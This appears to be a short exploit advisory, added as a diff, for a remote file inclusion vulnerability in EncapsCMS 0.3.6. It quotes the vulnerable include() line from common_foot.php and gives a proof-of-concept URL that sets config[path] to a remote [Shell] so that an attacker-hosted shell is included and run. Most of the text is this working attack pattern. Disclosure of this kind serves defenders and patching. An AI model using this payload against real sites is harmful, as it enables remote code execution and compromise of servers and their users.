@@ -1,0 +1,15 @@
+[+] EncapsCMS <= 0.3.6 (config[path]) Remote File Include Vulnerability
+[+] Discovered by cr4wl3r <cr4wl3r[!]linuxmail.org>
+[+] Download : http://scripts.ringsworld.com/content-management/encapscms-0.3.6/
+
+
+[+] Vuln Code : [common_foot.php]
+
+include($config['path']."idx_foot.html");
+if($config["debug"]>0){
+	echo '<pre><table width=100% bgcolor=silver><tr><td></td></tr></table>';	
+	echo '$_POST:';var_dump($_POST);
+
+[+] PoC : 
+
+[EncapsCMS_path]/common_foot.php?config[path]=[Shell]
